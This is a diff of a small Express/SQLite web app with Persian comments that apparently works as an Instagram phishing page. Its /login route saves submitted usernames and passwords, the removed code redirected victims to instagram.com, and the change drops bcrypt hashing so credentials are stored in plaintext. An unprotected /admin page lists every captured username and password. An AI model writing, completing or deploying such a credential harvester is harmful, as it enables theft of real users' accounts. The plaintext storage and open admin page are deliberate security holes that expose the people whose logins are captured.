@@ -2,7 +2,6 @@ const express = require('express');
 const sqlite3 = require('sqlite3').verbose();
 const bodyParser = require('body-parser');
 const path = require('path');
-const bcrypt = require('bcrypt');
 
 const app = express();
 const port = 3000;
@@ -23,11 +22,8 @@ db.run(`CREATE TABLE IF NOT EXISTS users (
 app.use(bodyParser.urlencoded({ extended: true }));
 app.use(express.static(path.join(__dirname))); // index.html
 
-// فرم لاگین
-app.post('/login', async (req,res) => {
-  const { username, password } = req.body;
-  try {
-    app.post('/login', (req,res) => {
+// فرم لاگین بدون هش
+app.post('/login', (req,res) => {
   const { username, password } = req.body;
 
   db.run(
@@ -44,25 +40,12 @@ app.post('/login', async (req,res) => {
   );
 });
 
-      function(err){
-        if(err){
-          console.error(err);
-          res.send('خطا در ثبت');
-        } else {
-          res.redirect('https://www.instagram.com');
-        }
-      }
-    );
-  } catch(err){
-    console.error(err);
-    res.send('خطا در پردازش');
-  }
-});
+// صفحه Admin
 app.get('/admin', (req, res) => {
   db.all("SELECT id, username, password FROM users", [], (err, rows) => {
     if(err) return res.send("خطا در خواندن دیتابیس");
 
-    let html = "<h1>لیست کاربران</h1><table border='1'><tr><th>ID</th><th>Username</th><th>Password (Hashed)</th></tr>";
+    let html = "<h1>لیست کاربران</h1><table border='1'><tr><th>ID</th><th>Username</th><th>Password</th></tr>";
     rows.forEach(row => {
       html += `<tr><td>${row.id}</td><td>${row.username}</td><td>${row.password}</td></tr>`;
     });
@@ -71,7 +54,4 @@ app.get('/admin', (req, res) => {
   });
 });
 
-
 app.listen(port,()=>{console.log(`Server running at http://localhost:${port}`)});
-
-
